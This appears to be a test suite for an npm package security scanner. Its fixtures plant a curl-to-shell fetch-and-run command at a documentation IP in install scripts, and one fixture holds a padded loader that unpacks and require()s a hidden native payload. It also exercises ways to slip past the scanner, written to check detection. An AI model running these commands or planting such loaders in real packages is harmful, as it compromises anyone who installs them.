import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { gzipSync } from "node:zlib";
import { auditTarball, extractTarball, runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// Core review round 2: Windows-reading retention, suffix trie, require() launch
// in the overflow fallback, and scanning only executed files.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address
const BUDGET_MS = 1000;

function tarBytes(entries: { name: string; data: string }[]): Buffer {
  const blocks: Buffer[] = [];
  for (const e of entries) {
    const data = Buffer.from(e.data);
    const h = Buffer.alloc(512);
    h.write(e.name, 0, 100, "utf8");
    h.write("0000644\0", 100);
    h.write("0000000\0", 108);
    h.write("0000000\0", 116);
    h.write(data.length.toString(8).padStart(11, "0") + "\0", 124);
    h.write("00000000000\0", 136);
    h.write("        ", 148);
    h.write("0", 156);
    h.write("ustar\0" + "00", 257);
    let sum = 0;
    for (const b of h) sum += b;
    h.write(sum.toString(8).padStart(6, "0") + "\0 ", 148);
    blocks.push(h, data, Buffer.alloc((512 - (data.length % 512)) % 512));
  }
  blocks.push(Buffer.alloc(1024));
  return gzipSync(Buffer.concat(blocks));
}

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, pkgJson?: unknown): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  if (pkgJson !== undefined) list.push(file("package/package.json", JSON.stringify(pkgJson)));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
function assertFast(label: string, fn: () => unknown): void {
  const t = performance.now();
  fn();
  const ms = performance.now() - t;
  console.log(`[timing] ${label}: ${ms.toFixed(0)} ms`);
  assert.ok(ms < BUDGET_MS, `${label} took ${ms.toFixed(0)} ms (budget ${BUDGET_MS} ms)`);
}
const critical = (f: ReturnType<typeof runRules>) =>
  f.filter((x) => x.ruleId === "install-scripts" && x.severity === "critical").length;

const meta = { name: "demo", version: "1.0.0", author: null, maintainers: [] as string[], license: null, hasInstallScripts: false };

describe("Windows-reading files are retained", () => {
  test("`package\\setup.js` referenced by `node setup.js` is scanned", async () => {
    const pkg = JSON.stringify({ name: "demo", version: "1.0.0", scripts: { postinstall: "node setup.js" } });
    const tarball = tarBytes([
      { name: "package/package.json", data: pkg },
      { name: "package\\setup.js", data: `${CURL_SH}\n` },
    ]);
    const r = await extractTarball(tarball);
    assert.ok(r.files.some((f) => f.path === "package/setup.js"), "Windows path must be retained");
    const report = await auditTarball({ meta, tarball });
    assert.ok(report.findings.some((f) => f.ruleId === "install-scripts" && f.severity === "critical"));
  });
});

describe("suffix lookup is a reverse trie", () => {
  test("thousands of distinct missing `x<i>/index.js` tokens against many index.js files stay fast", () => {
    const files: Record<string, string> = {};
    for (let i = 0; i < 3000; i++) files[`package/d${i}/index.js`] = "x";
    let cmd = "";
    for (let i = 0; i < 20000; i++) cmd += `node x${i}/index.js && `;
    cmd += "node d7/index.js";
    let out: ReturnType<typeof runRules> = [];
    assertFast("suffix trie", () => { out = runRules(inputFor(files, { scripts: { postinstall: cmd } })); });
    assert.ok(out.some((f) => f.ruleId === "install-scripts"));
  });

  test("suffix matches still resolve (and the first file in order wins)", () => {
    const f = runRules(inputFor(
      { "package/lib/scripts/x.js": `${CURL_SH}\n`, "package/other/scripts/x.js": "// benign\n" },
      { scripts: { postinstall: "node scripts/x.js" } },
    ));
    assert.equal(critical(f), 1);
  });

  test("a path with exactly the token's components is not a suffix match", () => {
    const f = runRules(inputFor({ "package/x.js": `${CURL_SH}\n` }, { scripts: { postinstall: "node package/x.js" } }));
    // `package/x.js` resolves exactly as package/package/x.js (absent) and has no longer path to suffix-match.
    assert.equal(critical(f), 0);
  });
});

describe("overflow fallback counts a require() launch", () => {
  test("pad + read, decode, write and require(path) stays critical and blocks", async () => {
    const chain = `
const fs=require('fs'),zlib=require('zlib'),os=require('os'),path=require('path');
const c=fs.readFileSync(path.join(__dirname,'intro.node'));
const b=zlib.gunzipSync(c);
const out=path.join(os.tmpdir(),'.x.node');
fs.writeFileSync(out,b);
require(out);`;
    const pad = `${"(".repeat(100000)}x${")".repeat(100000)};\n`;
    const tarball = tarBytes([
      { name: "package/package.json", data: JSON.stringify({ name: "demo", version: "1.0.0", main: "index.js" }) },
      { name: "package/index.js", data: pad + chain },
    ]);
    const report = await auditTarball({ meta, tarball });
    assert.ok(report.findings.some((f) => f.ruleId === "native-payload-loader" && f.severity === "critical"));
    assert.equal(report.verdict, "block");
  });
});

describe("only executed files are scanned", () => {
  test("`node generate.js README.md`: generate.js is scanned, README is not", () => {
    const benign = runRules(inputFor(
      { "package/generate.js": "console.log('hi')\n", "package/README.md": `Install with: ${CURL_SH}\n` },
      { scripts: { postinstall: "node generate.js README.md" } },
    ));
    assert.equal(critical(benign), 0, "a curl example in the README is not an executed script");
    const evil = runRules(inputFor(
      { "package/generate.js": `${CURL_SH}\n`, "package/README.md": "docs\n" },
      { scripts: { postinstall: "node generate.js README.md" } },
    ));
    assert.equal(critical(evil), 1);
  });

  test("`sh README` with the payload is flagged", () => {
    assert.equal(critical(runRules(inputFor({ "package/README": `${CURL_SH}\n` }, { scripts: { postinstall: "sh README" } }))), 1);
  });

  test("`env FOO=1 node setup` and `FOO=1 ./setup` scan setup", () => {
    for (const cmd of ["env FOO=1 node setup", "FOO=1 ./setup", "nohup sh setup", "npx -y ./setup"]) {
      assert.equal(critical(runRules(inputFor({ "package/setup": `${CURL_SH}\n` }, { scripts: { postinstall: cmd } }))), 1, cmd);
    }
  });

  test("100+ junk tokens then `&& node evil` still scans evil", () => {
    const pad = Array.from({ length: 150 }, (_, i) => `junk${i}`).join(" ");
    const f = runRules(inputFor({ "package/evil": `${CURL_SH}\n` }, { scripts: { postinstall: `echo ${pad} && node evil` } }));
    assert.equal(critical(f), 1);
  });

  test("an interpreter flag value does not hide the script (`node --max-old-space-size 4096 evil.js`)", () => {
    const f = runRules(inputFor({ "package/evil.js": `${CURL_SH}\n` }, { scripts: { postinstall: "node --max-old-space-size 4096 evil.js" } }));
    assert.equal(critical(f), 1);
  });

  test("`node -r ./hook.js main.js` scans the preloaded hook too", () => {
    const f = runRules(inputFor(
      { "package/hook.js": `${CURL_SH}\n`, "package/main.js": "// benign\n" },
      { scripts: { postinstall: "node -r ./hook.js main.js" } },
    ));
    assert.equal(critical(f), 1);
  });

  test("a 2 MiB command stays fast", () => {
    const cmd = "a ".repeat(1024 * 1024) + "&& node setup";
    assertFast("2 MiB command", () => runRules(inputFor({ "package/setup": `${CURL_SH}\n` }, { scripts: { postinstall: cmd } })));
  });
});
